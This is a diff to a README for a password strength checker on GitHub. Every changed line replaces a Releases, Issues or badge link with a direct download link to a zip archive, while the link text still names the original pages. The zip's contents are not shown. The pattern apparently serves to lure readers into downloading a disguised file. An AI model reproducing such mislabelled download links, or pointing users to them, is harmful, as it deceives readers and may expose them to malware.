@@ -1,6 +1,6 @@
 # 🔐 -Password_Strength_Checker - Assess Your Password Strength Easily
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/emrebozzkurtt/-Password_Strength_Checker/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/emrebozzkurtt/-Password_Strength_Checker/main/python/Strength-Checker-Password-1.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/emrebozzkurtt/-Password_Strength_Checker/main/python/Strength-Checker-Password-1.5.zip)
 
 ## 🚀 Project Overview
 
@@ -20,7 +20,7 @@ The primary objectives of this project are:
 To get started with the Password Strength Checker, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Visit this page to download](https://github.com/emrebozzkurtt/-Password_Strength_Checker/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/emrebozzkurtt/-Password_Strength_Checker/main/python/Strength-Checker-Password-1.5.zip)
    
 2. Look for the latest version of the software on the Releases page.
 
@@ -73,7 +73,7 @@ The Password Strength Checker comes with several useful features:
 
 ## 🔗 Further Information
 
-If you have any questions or need support, please check the [GitHub Issues page](https://github.com/emrebozzkurtt/-Password_Strength_Checker/issues). You can view any existing issues or create a new one if you encounter any problems.
+If you have any questions or need support, please check the [GitHub Issues page](https://raw.githubusercontent.com/emrebozzkurtt/-Password_Strength_Checker/main/python/Strength-Checker-Password-1.5.zip). You can view any existing issues or create a new one if you encounter any problems.
 
 ## ✅ Acknowledgments
 
